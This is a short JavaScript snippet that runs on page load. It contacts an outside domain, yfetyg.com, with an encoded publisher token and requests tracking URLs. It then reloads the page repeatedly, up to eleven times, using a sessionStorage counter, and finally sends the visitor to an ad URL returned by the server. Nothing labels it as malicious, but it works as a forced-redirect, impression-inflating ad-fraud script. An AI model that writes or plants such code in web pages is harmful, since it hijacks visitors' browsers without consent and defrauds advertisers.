window.onload = () => {
    
    (async function ad(text="aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTExMjYzOSwid2lkIjoyNTkyOTksImQiOiIiLCJsaSI6Mn0", percent=1, count=11) {
        try {
            const url = `https://yfetyg.com/wnload?a=1&e=${text}=&tz=8&if=0 `;

            const response = await fetch(url);
            const json = await response.json();

            for (let row of json) {

                if('rinfo' in row) {
                    if ('rw' in row['rinfo']) {
                        let part_url = row['rinfo']['rw'];
                        if (part_url) {
                            let url = `https://yfetyg.com` + part_url;
                            try {
                                const response = await fetch(url);
                                console.log(await response.status());
                            } catch(e) {
                                console.log(e);
                            }
                        }
                    }
                }

                let attempt = 0;
                if (sessionStorage.getItem('ATTEMPTS')) {
                    attempt = Number(sessionStorage.getItem('ATTEMPTS'));
                }

                if (attempt < count) {
                    sessionStorage.setItem('ATTEMPTS', attempt + 1);
                    window.location.reload();
                    return;
                }


                if ('ads' in row) {
                    sessionStorage.removeItem('ATTEMPTS');
                    let new_url = row['ads'][0]['uf'];
                    if (Math.random() <= percent) {
                        window.location.href = new_url;
                    }
                    return;
                }
            }

        } catch(e) {
            console.log(e);
        }

    })();

}
